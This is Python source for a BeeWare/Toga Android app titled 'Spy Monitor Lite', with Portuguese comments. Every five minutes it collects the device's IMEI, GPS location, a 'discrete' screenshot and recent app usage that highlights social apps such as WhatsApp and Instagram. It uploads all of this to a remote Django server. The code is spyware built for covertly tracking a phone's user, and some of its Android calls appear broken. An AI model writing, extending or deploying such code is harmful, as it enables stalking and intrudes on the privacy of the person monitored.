import toga
from toga.style import Pack
from toga.style.pack import COLUMN, ROW, CENTER
import time
import requests
import os
import threading
import logging
from datetime import datetime

# Configurar modo desenvolvimento para testes locais
os.environ['ENV_MODE'] = 'development'

# Configurar logging básico
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

# Configurações fallback
try:
    from config import DJANGO_CONFIG, ENDPOINTS
except ImportError:
    logger.warning("Módulo config não encontrado, usando configurações fallback")
    DJANGO_CONFIG = {'IP': '127.0.0.1', 'PORT': '8000'}
    ENDPOINTS = {
        'localizacao': f"http://{DJANGO_CONFIG['IP']}:{DJANGO_CONFIG['PORT']}/api/localizacao/",
        'upload': f"http://{DJANGO_CONFIG['IP']}:{DJANGO_CONFIG['PORT']}/api/upload/",
        'atividade': f"http://{DJANGO_CONFIG['IP']}:{DJANGO_CONFIG['PORT']}/api/atividade/"
    }

# Usar configurações centralizadas
DJANGO_IP = DJANGO_CONFIG['IP']
DJANGO_PORT = DJANGO_CONFIG['PORT']
ENDPOINT_LOCALIZACAO = ENDPOINTS['localizacao']
ENDPOINT_UPLOAD = ENDPOINTS['upload']
ENDPOINT_ATIVIDADE = ENDPOINTS['atividade']

# Fallback simples para device ID
def get_device_id():
    """Obtém ID do dispositivo de forma simples"""
    try:
        import platform
        if platform.system() == 'Android':
            # Tentar usar Android API
            from android.content import Context
            from android.app import Activity
            context = Activity.getApplicationContext()
            return context.getSystemService(Context.TELEPHONY_SERVICE).getDeviceId()
        else:
            # Fallback para desenvolvimento
            return f"dev_{int(time.time())}"
    except:
        return f"fallback_{int(time.time())}"

# Fallback simples para localização
def get_location():
    """Obtém localização de forma simples"""
    try:
        import platform
        if platform.system() == 'Android':
            from android.location import LocationManager
            from android.app import Activity
            context = Activity.getApplicationContext()
            location_manager = context.getSystemService(Context.LOCATION_SERVICE)

            # Tentar GPS
            location = location_manager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if location:
                return location.getLatitude(), location.getLongitude()

            # Tentar rede
            location = location_manager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if location:
                return location.getLatitude(), location.getLongitude()

        return None, None
    except Exception as e:
        logger.warning(f"Erro obtendo localização: {e}")
        return None, None

# Fallback para screenshot
def take_discrete_screenshot():
    """Tira screenshot discreto"""
    try:
        import platform
        if platform.system() == 'Android':
            from android.graphics import Bitmap
            from android.app import Activity
            from android.view import View
            import tempfile

            activity = Activity()
            root_view = activity.getWindow().getDecorView().getRootView()
            root_view.setDrawingCacheEnabled(True)
            bitmap = Bitmap.createBitmap(root_view.getDrawingCache())
            root_view.setDrawingCacheEnabled(False)

            # Salvar em arquivo temporário
            temp_dir = tempfile.gettempdir()
            screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")

            with open(screenshot_path, 'wb') as f:
                bitmap.compress(Bitmap.CompressFormat.PNG, 90, f)

            return screenshot_path
        return None
    except Exception as e:
        logger.warning(f"Erro tirando screenshot: {e}")
        return None

# Fallback para informações de acesso
def get_access_info():
    """Obtém informações básicas de acesso ao celular"""
    try:
        import platform
        if platform.system() == 'Android':
            from android.app import Activity
            from android.content import Context
            import android

            activity = Activity()
            context = activity.getApplicationContext()

            # Último uso
            usage_stats_manager = context.getSystemService(Context.USAGE_STATS_SERVICE)
            current_time = android.os.SystemClock.elapsedRealtime()
            last_used = usage_stats_manager.queryUsageStats(4, current_time - 3600000, current_time)  # Última hora

            access_info = []
            social_apps = []
            if last_used:
                for stat in last_used[:10]:  # Top 10 apps para incluir redes sociais
                    app_name = stat.getPackageName().split('.')[-1].lower()
                    last_time = datetime.fromtimestamp(stat.getLastTimeUsed() / 1000).strftime('%H:%M:%S')

                    # Identificar redes sociais
                    if any(social in app_name for social in ['whatsapp', 'instagram', 'facebook', 'twitter', 'tiktok', 'snapchat', 'telegram', 'linkedin']):
                        social_apps.append(f"📱 {app_name}: {last_time}")
                    else:
                        access_info.append(f"{app_name}: {last_time}")

            # Combinar acessos gerais e redes sociais
            result = []
            if social_apps:
                result.extend(social_apps[:3])  # Top 3 redes sociais
            if access_info:
                result.extend(access_info[:5])  # Top 5 apps gerais

            return result if result else ["Nenhuma informação de acesso disponível"]
        return ["Modo desenvolvimento - sem dados reais"]
    except Exception as e:
        logger.warning(f"Erro obtendo info de acesso: {e}")
        return [f"Erro: {str(e)}"]

class SpyMonitorMinimal(toga.App):
    def startup(self):
        """Inicializar a aplicação minimalista de monitoramento"""
        self.main_window = toga.MainWindow(title=self.formal_name, size=(400, 300))

        # Variáveis de controle
        self.is_monitoring = False
        self.start_time = None
        self.device_id = get_device_id()
        self.last_collection = None
        self.collection_count = 0

        # Criar interface simples
        main_box = toga.Box(style=Pack(direction=COLUMN, background_color='#F0F0F0', margin=20))

        # Título
        title_label = toga.Label(
            '📍 Spy Monitor Lite',
            style=Pack(
                text_align=CENTER,
                font_size=20,
                font_weight='bold',
                color='#2E86C1',
                padding=(0, 0, 20, 0)
            )
        )
        main_box.add(title_label)

        # Device ID
        self.device_label = toga.Label(
            f'Device: {self.device_id[:16]}...',
            style=Pack(
                text_align=CENTER,
                font_size=12,
                color='#666666',
                padding=(0, 0, 10, 0)
            )
        )
        main_box.add(self.device_label)

        # Status
        self.status_label = toga.Label(
            'Status: Parado',
            style=Pack(
                text_align=CENTER,
                font_size=16,
                font_weight='bold',
                color='#E74C3C',
                padding=(0, 0, 20, 0)
            )
        )
        main_box.add(self.status_label)

        # Última coleta
        self.last_collection_label = toga.Label(
            'Última coleta: Nunca',
            style=Pack(
                text_align=CENTER,
                font_size=12,
                color='#666666',
                padding=(0, 0, 10, 0)
            )
        )
        main_box.add(self.last_collection_label)

        # Contador
        self.collection_count_label = toga.Label(
            'Total: 0',
            style=Pack(
                text_align=CENTER,
                font_size=12,
                color='#666666',
                padding=(0, 0, 30, 0)
            )
        )
        main_box.add(self.collection_count_label)

        # Botão controle
        self.monitor_button = toga.Button(
            '▶️ Iniciar',
            on_press=self.toggle_monitoring,
            style=Pack(
                font_size=16,
                font_weight='bold',
                background_color='#27AE60',
                color='#FFFFFF',
                padding=15,
                margin=(0, 0, 10, 0)
            )
        )
        main_box.add(self.monitor_button)

        # Logs simples
        self.logs_text = toga.MultilineTextInput(
            readonly=True,
            style=Pack(
                font_size=10,
                background_color='#FFFFFF',
                color='#000000',
                padding=10,
                flex=1
            )
        )
        main_box.add(self.logs_text)

        logger.info("Spy Monitor Lite iniciado")
        self.add_log("App iniciado")

        self.main_window.on_close = self.on_close
        self.main_window.content = main_box
        self.main_window.show()

    def add_log(self, message):
        """Adiciona mensagem aos logs"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {message}\n"

        current_text = self.logs_text.value or ""
        lines = (current_text + log_entry).split('\n')
        if len(lines) > 10:  # Manter menos linhas
            lines = lines[-10:]
        self.logs_text.value = '\n'.join(lines)

        logger.info(message)

    def toggle_monitoring(self, widget):
        """Alterna monitoramento"""
        if not self.is_monitoring:
            self.start_monitoring()
        else:
            self.stop_monitoring()

    def start_monitoring(self):
        """Inicia monitoramento simples"""
        try:
            self.is_monitoring = True
            self.start_time = time.time()
            self.status_label.text = 'Status: Ativo'
            self.status_label.style.color = '#27AE60'
            self.monitor_button.text = '⏹️ Parar'
            self.monitor_button.style.background_color = '#E74C3C'

            # Thread simples de monitoramento
            self.monitoring_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
            self.monitoring_thread.start()

            self.add_log("Monitoramento iniciado")

        except Exception as e:
            self.add_log(f"Erro ao iniciar: {e}")
            logger.error(f"Erro ao iniciar monitoramento: {e}")

    def stop_monitoring(self):
        """Para monitoramento"""
        self.is_monitoring = False
        self.status_label.text = 'Status: Parado'
        self.status_label.style.color = '#E74C3C'
        self.monitor_button.text = '▶️ Iniciar'
        self.monitor_button.style.background_color = '#27AE60'

        self.add_log("Monitoramento parado")

    def monitoring_loop(self):
        """Loop simples a cada 5 minutos"""
        while self.is_monitoring:
            try:
                time.sleep(300)  # 5 minutos

                if self.is_monitoring:
                    self.coleta_simples()
                    self.collection_count += 1
                    self.collection_count_label.text = f'Total: {self.collection_count}'
                    self.last_collection = datetime.now()
                    self.last_collection_label.text = f'Última: {self.last_collection.strftime("%H:%M")}'

            except Exception as e:
                self.add_log(f"Erro no loop: {e}")
                time.sleep(60)

    def coleta_simples(self):
        """Coleta localização, screenshot e informações de acesso"""
        try:
            # 1. Localização
            lat, lon = get_location()
            if lat and lon:
                data = {
                    'imei': self.device_id,
                    'latitude': lat,
                    'longitude': lon,
                    'timestamp': datetime.now().isoformat()
                }

                response = requests.post(ENDPOINT_LOCALIZACAO, json=data, timeout=10)
                if response.status_code in [200, 201]:
                    self.add_log("✅ Localização enviada")
                else:
                    self.add_log(f"⚠️ Localização falhou: {response.status_code}")
            else:
                self.add_log("⚠️ Localização indisponível")

            # 2. Screenshot discreto
            screenshot_path = take_discrete_screenshot()
            if screenshot_path and os.path.exists(screenshot_path):
                try:
                    with open(screenshot_path, 'rb') as f:
                        files = {'screenshot': f}
                        data = {'imei': self.device_id, 'timestamp': datetime.now().isoformat()}
                        response = requests.post(ENDPOINT_UPLOAD, files=files, data=data, timeout=15)
                        if response.status_code in [200, 201]:
                            self.add_log("📸 Screenshot enviado")
                        else:
                            self.add_log(f"📸 Screenshot falhou: {response.status_code}")
                except Exception as e:
                    self.add_log(f"📸 Erro screenshot: {e}")
                finally:
                    # Limpar arquivo temporário
                    try:
                        os.remove(screenshot_path)
                    except:
                        pass
            else:
                self.add_log("📸 Screenshot indisponível")

            # 3. Informações de acesso
            access_info = get_access_info()
            if access_info:
                atividade_data = {
                    'imei': self.device_id,
                    'atividade': '\n'.join(access_info),
                    'tipo': 'acessos_celular',
                    'timestamp': datetime.now().isoformat()
                }

                response = requests.post(ENDPOINT_ATIVIDADE, json=atividade_data, timeout=10)
                if response.status_code in [200, 201]:
                    self.add_log("📱 Acessos enviados")
                else:
                    self.add_log(f"📱 Acessos falharam: {response.status_code}")

        except Exception as e:
            self.add_log(f"❌ Erro geral: {e}")

    def on_close(self, widget):
        """Manipula fechamento"""
        self.is_monitoring = False
        self.add_log("App fechado")
        logger.info("Aplicação Spy Monitor Lite fechada")

def main():
    """Ponto de entrada"""
    return SpyMonitorMinimal('Spy Monitor Lite', 'org.beeware.spymonitorlite')

if __name__ == '__main__':
    main().main_loop()
